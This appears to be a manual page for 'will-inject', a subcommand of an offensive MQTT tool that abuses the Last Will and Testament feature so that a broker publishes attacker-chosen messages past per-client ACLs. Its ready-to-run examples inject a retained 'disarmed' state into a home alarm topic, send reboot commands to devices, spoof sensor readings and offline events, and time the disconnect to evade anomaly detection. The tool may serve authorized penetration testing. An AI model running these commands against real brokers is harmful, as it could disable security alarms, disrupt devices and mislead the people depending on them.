# will-inject

Register a crafted Last Will and Testament (LWT) in the CONNECT packet, hold
the connection open, then close the TCP socket without sending DISCONNECT.
The broker sees an ungraceful disconnect and publishes the will payload on the
target topic.

## Synopsis

```bash
mqattack will-inject [OPTIONS] -t <TOPIC>
```

## Options

| Flag | Default | Description |
|------|---------|-------------|
| `-t, --topic <TOPIC>` | *(required)* | Topic the broker publishes the will to on disconnect |
| `-m, --message <MSG>` | `mqattack-will` | Will payload |
| `-q, --qos <QOS>` | `1` | QoS for the will message (0, 1 or 2) |
| `-r, --retain` | off | Persist the will as a retained message |
| `--hold <SECS>` | `2` | Seconds to stay connected before triggering |
| `--monitor <TOPIC>` | - | Subscribe on a second connection to capture the delivery |
| `--monitor-wait <SECS>` | `5` | Seconds to listen after disconnect |

## How it works

1. A second "monitor" connection is opened first (if `--monitor` is set).
2. The main connection is established with the crafted LWT in the CONNECT packet.
3. The broker confirms the connection via ConnAck.
4. The client holds the connection open for `--hold` seconds.
5. The TCP socket is closed without sending a DISCONNECT frame.
6. The broker treats this as an ungraceful disconnect and publishes the will.
7. The monitor connection captures and prints the delivered message.

## Why this matters

The LWT is registered by the *connecting client*, but the *broker* performs the
publish.  This means:

- The will delivery bypasses per-client publish ACLs.
- With `--retain`, the injected message persists until explicitly cleared.
- Downstream automation that reacts to topic changes can be triggered without
  the attacker holding a direct publish permission.

## Examples

### Inject a retained "disarmed" state into an alarm topic

```bash
mqattack will-inject -H 192.168.1.10 \
  -t home/alarm/status -m 'disarmed' -r
```

### Inject a command payload and verify delivery

```bash
mqattack will-inject -H 192.168.1.10 \
  -t device/42/cmd -m '{"action":"reboot"}' -q 1 \
  --monitor device/42/cmd --monitor-wait 10
```

### Blend in as a long-lived client before triggering

Simulate a legitimate sensor client that has been connected for a while before
the "crash":

```bash
mqattack will-inject -H 192.168.1.10 \
  -t sensors/temperature -m '999.9' --hold 60 --retain
```

### Will injection over TLS with credentials

```bash
mqattack will-inject --cafile ca.crt \
  -H broker.example.com -p 8883 \
  -u sensor01 -P secret \
  -t sensors/temp -m '-99' -r
```

### Spoof a device offline event

```bash
mqattack will-inject -H 192.168.1.10 \
  -t devices/gateway/status -m 'offline' -r -q 1 \
  --monitor devices/gateway/status
```

## Notes

- `--hold 0` triggers the disconnect immediately after ConnAck; use a longer
  value to stay below anomaly detection thresholds.
- Monitoring on a different topic than the will topic is valid - useful when
  the downstream subscriber reacts by publishing to another topic.
- Will injection requires the broker to accept the CONNECT packet; valid
  credentials (or anonymous access) are required.
